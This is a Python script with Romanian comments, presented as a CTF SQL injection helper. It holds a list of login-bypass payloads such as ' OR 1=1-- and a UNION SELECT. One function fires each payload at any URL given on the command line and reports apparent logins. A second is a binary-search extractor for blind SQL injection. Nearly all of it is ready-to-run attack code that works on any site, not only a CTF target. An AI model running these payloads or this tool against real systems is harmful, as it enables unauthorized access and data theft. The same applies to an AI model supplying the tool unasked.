#!/usr/bin/env python3
"""
CTF SQL Injection Helper & Binary Search Extractor
Include o colecție de payload-uri comune de auth-bypass și o funcție binară pentru extracții rapide blind SQLi.
"""

import sys
import time
import argparse
import requests

AUTH_BYPASS_PAYLOADS = [
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' OR ''='",
    "') OR ('1'='1",
    '") OR ("1"="1',
    "admin' or '1'='1",
    "' UNION SELECT 1, 'admin', 'password'--"
]

def test_auth_bypass(target_url, user_field="username", pass_field="password", fixed_pass="test1234", method="POST"):
    """Testează o serie de payload-uri de login bypass."""
    session = requests.Session()
    print(f"[*] Testare {len(AUTH_BYPASS_PAYLOADS)} payload-uri auth bypass pe {target_url}...")

    for payload in AUTH_BYPASS_PAYLOADS:
        data = {user_field: payload, pass_field: fixed_pass}
        try:
            if method.upper() == "POST":
                resp = session.post(target_url, data=data, timeout=5, allow_redirects=False)
            else:
                resp = session.get(target_url, params=data, timeout=5, allow_redirects=False)

            # Detectare semnale de succes (redirect 302/303, sau prezență cuvinte cheie)
            is_redirect = resp.status_code in [301, 302, 303, 307]
            has_auth = any(word in resp.text.lower() for word in ["dashboard", "welcome", "logout", "admin", "flag{", "algo{"])
            
            if is_redirect or has_auth:
                print(f"[+] ✅ Succes posibil cu payload: {payload} (Status: {resp.status_code}, Len: {len(resp.content)})")
                if "flag" in resp.text.lower():
                    print(f"    Răspuns: {resp.text[:200]}")
            else:
                print(f"[-] Eșuat: {payload[:25]:<25} -> {resp.status_code} ({len(resp.content)} bytes)")
        except Exception as e:
            print(f"[!] Eroare pentru {payload}: {e}")

def binary_search_extractor(condition_func, max_len=64, printable_only=True):
    """
    Extrage un șir caracter cu caracter folosind căutare binară (O(log N) per caracter).
    `condition_func(position, ascii_val)` trebuie să returneze True dacă char_at(pos) > ascii_val.
    """
    extracted = ""
    low_bound = 32 if printable_only else 0
    high_bound = 126 if printable_only else 255

    print("[*] Pornire extracție blind SQLi prin căutare binară...")

    for pos in range(1, max_len + 1):
        low = low_bound
        high = high_bound
        found_char = None

        while low <= high:
            mid = (low + high) // 2
            # Testează dacă valoarea ASCII a caracterului curent este mai mare decât mid
            if condition_func(pos, mid):
                low = mid + 1
            else:
                high = mid - 1

        found_char = chr(low)
        if low == low_bound and not condition_func(pos, low - 1):
            # Șirul s-a terminat (caracter nul sau sfârșit de text)
            print(f"\n[+] Extracție încheiată la poziția {pos-1}.")
            break

        extracted += found_char
        sys.stdout.write(f"\r[+] Extras [{len(extracted)}]: {extracted}")
        sys.stdout.flush()

    print(f"\n[+] Rezultat final extras: {extracted}")
    return extracted

def main():
    parser = argparse.ArgumentParser(description="CTF SQL Injection Testing Helper")
    parser.add_argument("--url", help="URL login sau endpoint de test")
    parser.add_argument("--user-field", default="username", help="Numele câmpului de username (default: username)")
    parser.add_argument("--pass-field", default="password", help="Numele câmpului de password (default: password)")
    parser.add_argument("--method", default="POST", choices=["GET", "POST"], help="Metoda HTTP")

    args = parser.parse_args()
    if args.url:
        test_auth_bypass(args.url, user_field=args.user_field, pass_field=args.pass_field, method=args.method)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
